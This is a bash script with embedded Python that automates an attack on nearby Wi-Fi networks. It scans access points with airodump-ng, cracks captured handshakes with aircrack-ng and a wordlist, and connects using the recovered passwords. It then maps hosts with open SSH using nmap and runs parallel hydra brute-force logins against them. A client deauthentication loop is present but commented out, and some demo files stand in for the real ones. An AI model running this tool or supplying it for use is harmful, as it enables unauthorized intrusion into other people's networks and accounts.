#! /bin/bash

# map local area, list routers
xterm -hold -geometry -10+10 -e airodump-ng -w dump mon0 &
PID1=$!
sleep 5s
kill $PID1
cat dump-01.csv | awk -F "," '{ print $1, $4 }' | grep '[0-9]\+' >> atckPoints

echo monitoring...
cat atckPoints
rm -f dump*
sleep 2s
# monitor all routers
python << END
import csv
import subprocess

with open('atckPoints', 'r') as csvfile:
        reader = csv.reader(csvfile)
        i = 0; h = 0; v = 0
        for row in reader:
                ap = row[-1].split()
                cmd = "xterm -hold -geometry -{}+{} -e airodump-ng -c {} --bssid {} -w AP{} mon0 &".format(h, v, ap[1], ap[0], i)
                p = subprocess.Popen(cmd , shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                i += 1
                h += 100
                v += 30
                p.wait()
END
sleep 30s
killall xterm

# create list of all clients
ls AP?-01.csv > csvfiles
for line in $(cat csvfiles)
do
	echo | cat $line | awk -F "," '{ print $1 }' | grep '[0-9]\+' | tail -n +2 >> clients
done

# deauth all clients 1 router at a time
#for AP in $(cat atckPoints)
#do
#	echo $AP
#	for client in $(cat clients)
#	do
#		echo $client
#		aireplay-ng -0 1 -a $AP -c $client --ignore-negative-one mon0
#	done
#done

# aircrack all cap files
ls AP?-01.cap > capfiles
echo to crack...
cat capfiles
for line in $(cat capfiles)
do 
	echo cracking $line
	aircrack-ng -w pass.lst $line | awk '/FOUND/{print $4}' | head -n 1 >> netPass
	cat netPass
done

echo passwords found...
sort netPass | uniq -u >> netPass2
awk '!a[$2]++' netPass >> netPass2
cat demoPass # netPass2
sleep 5s

python << END
file = open('atckPoints', 'r')
lines = file.readlines()

newfile = open('conAPs.txt', 'w')

for line in lines:
        x = line.split()
        y = str(x[0])
        newfile.write(y + '\n')
END

echo connections to try...
cat demoAPs # conAPs.txt
sleep 5s


for bssid in $(cat demoAPs) # conAPs.txt
do
		for pass in $(cat demoPass) # netPass2
		do
			nmcli dev wifi con $bssid password $pass >& errors.log
		done
done

echo waiting for connection...
sleep 10s

# map
echo mapping open ssh...
nmap -sT 10.0.0.1/24 -p 22 --open > netMap
cat netMap | grep "Nmap scan" | tr -d 'Nmap scan report for' > sshTargets

# attack
echo attacking...
cat sshTargets
i="10"
for line in $(cat sshTargets | sed -n '1,3p')
do
        xterm -hold -geometry -$i+10 -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done
sleep 1s

i="10"
j="250"
for line in $(cat sshTargets | sed -n '4,6p')
do
        xterm -hold -geometry -$i+$j -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done
sleep 1s

i="10"
j="500"
for line in $(cat sshTargets | sed -n '7,9p')
do
        xterm -hold -geometry -$i+$j -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done

sleep 10s
killall xterm

# remove troublesome files for testing purposes
rm -f AP*
rm -f atckPoints
rm -f netPass*
rm -f hydra.restore
rm -f conAPs.txt

echo happy hacking...
sleep 5s
